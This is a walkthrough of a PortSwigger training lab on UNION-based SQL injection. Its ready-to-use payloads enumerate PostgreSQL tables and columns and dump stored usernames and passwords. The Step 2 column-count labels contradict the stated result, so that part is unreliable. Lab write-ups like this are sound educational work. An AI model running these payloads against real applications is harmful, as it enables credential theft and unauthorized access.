# SQL Injection Attack — Listing Database Contents on Non-Oracle Databases

**Difficulty:** Practitioner  
**Lab Source:** PortSwigger Web Security Academy  
**Topic:** SQL Injection — UNION Attack  
**Video Walkthrough:** [YouTube](https://youtu.be/JduM_dO8glw?si=-JBhOr1-XwEmk0CO)

---

## Overview

This lab demonstrates a **SQL injection vulnerability** in a product category filter. Because query results are reflected directly in the application's response, a **UNION-based attack** can be used to extract data from other tables — including a credentials table containing usernames and passwords.

**Objective:** Log in as the `administrator` user.

---

## Vulnerability Description

The application passes a user-controlled `category` parameter directly into a SQL query without sanitization. This allows an attacker to append additional SQL statements using the `UNION` operator to retrieve data from arbitrary tables in the database.

---

## Tools Required

- **Burp Suite** (Community or Professional) — for intercepting and modifying HTTP requests

---

## Step-by-Step Solution

### Step 1 — Intercept the Request

Use Burp Suite to intercept the HTTP request that sets the product category filter (a `GET` request with a `category` parameter in the URL). Send it to **Repeater** so you can modify and resend it freely.

---

### Step 2 — Find the Number of Columns (NULL Method)

Before using UNION, you must know exactly how many columns the original query returns. The safest way is to inject `NULL` values one by one and watch the HTTP response code:

**Attempt 1 — one column (returns 200 OK ✅):**
```
'+UNION+SELECT+NULL--
```

**Attempt 2 — two columns (returns 200 OK ✅):**
```
'+UNION+SELECT+NULL,NULL--
```

**Attempt 3 — one column (returns error / 500):**
```
'+UNION+SELECT+NULL,NULL,NULL--
```

> When the response returns **200 OK** instead of an error, you have found the correct column count. In this lab, the query returns **2 columns**.

---

### Step 3 — Identify Which Columns Can Hold Text Data

Not all columns may be able to return string data (some may be integers). Test each column by replacing one `NULL` at a time with a string value:

**Test column 1:**
```
'+UNION+SELECT+'ada',NULL--
```

**Test column 2:**
```
'+UNION+SELECT+NULL,'ada'--
```

> If the response returns 200 OK for both, **both columns can hold text data**. Confirmed together with:
```
'+UNION+SELECT+'ada','adsa'--
```

---

### Step 4 — Identify the Database Version

Now that we have 2 text-capable columns, extract the database version to understand which SQL syntax and system tables are available:

```
'+UNION+SELECT+version(),NULL--
```

> The response reveals the database is **PostgreSQL**. This matters because PostgreSQL uses `information_schema` (unlike Oracle which uses `ALL_TABLES`).

---

### Step 5 — Retrieve Table Names

Since the database is PostgreSQL, we know from documentation that `information_schema.tables` contains a column called `table_name`. Use it to list all tables:

```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

> Scroll through the results and find the table that stores user credentials — something like `users_abcdef`.

---

### Step 6 — Retrieve Column Names

Once the target table is identified, look up its columns. PostgreSQL's `information_schema.columns` holds column metadata and contains a `column_name` column:

```
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

> Replace `users_abcdef` with your actual table name. The response reveals column names like `username_abcdef` and `password_abcdef`.

---

### Step 7 — Dump Credentials

With the table name and column names known, extract all usernames and passwords:

```
'+UNION+SELECT+username_abcdef,password_abcdef+FROM+users_abcdef--
```

> Replace the table and column names with the actual values found above.

---

### Step 8 — Log In as Administrator

Find the row where `username = administrator` in the dumped output, copy the password, and log in through the application's login page.

**Lab solved! ✅**

---

## Methodology Flow

```
Intercept Request
      ↓
Find Column Count     →  NULL  →  NULL,NULL  →  200 OK = 2 columns
      ↓
Find Text Columns     →  'ada',NULL  /  NULL,'ada'  →  Both accept strings
      ↓
Get DB Version        →  version()  →  PostgreSQL
      ↓
List Tables           →  information_schema.tables    →  users_abcdef
      ↓
List Columns          →  information_schema.columns   →  username_X, password_X
      ↓
Dump Credentials      →  SELECT username_X, password_X FROM users_abcdef
      ↓
Login as administrator ✅
```

---

## All Payloads (in Order)

```sql
-- 1. Find column count (increment NULLs until 200 OK)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--          -- 200 OK → 2 columns confirmed

-- 2. Confirm both columns hold text
' UNION SELECT 'ada',NULL--
' UNION SELECT NULL,'ada'--
' UNION SELECT 'ada','adsa'--       -- both work ✅

-- 3. Get database version
' UNION SELECT version(),NULL--     -- reveals PostgreSQL

-- 4. List all table names
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- 5. Get column names from the target table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--

-- 6. Dump usernames and passwords
' UNION SELECT username_abcdef,password_abcdef FROM users_abcdef--
```

---

## Key Concepts

| Concept | Description |
|---|---|
| NULL Method | Incrementally add NULLs until 200 OK — safely identifies column count |
| UNION Attack | Appends a second SELECT to pull data from other tables |
| information_schema | Built-in metadata schema in PostgreSQL, MySQL, MSSQL (not Oracle) |
| `table_name` column | Found in `information_schema.tables` — lists all tables in the DB |
| `column_name` column | Found in `information_schema.columns` — lists columns per table |
| Text Column Check | Replace NULL with a string literal to verify that column returns text |
| `version()` | PostgreSQL function that returns the DB engine and version string |

---

## Why This Works (PostgreSQL Specific)

PostgreSQL exposes database metadata through the `information_schema` standard views:

- `information_schema.tables` → contains `table_name`, `table_schema`, `table_type`
- `information_schema.columns` → contains `column_name`, `table_name`, `data_type`

These are publicly documented and available to any user with SELECT privileges, making them reliable targets during a SQL injection enumeration attack.

---

## Mitigation

- Use **parameterized queries** (prepared statements) — never concatenate user input into SQL strings.
- Apply the **principle of least privilege** — database accounts should not have access to sensitive tables beyond what is necessary.
- Implement **input validation and WAF rules** as a secondary layer of defense.
- Consider **error suppression** in production — verbose errors and 500 responses aid attackers in column enumeration.

---

## References

- [PortSwigger SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PostgreSQL information_schema docs](https://www.postgresql.org/docs/current/information-schema.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
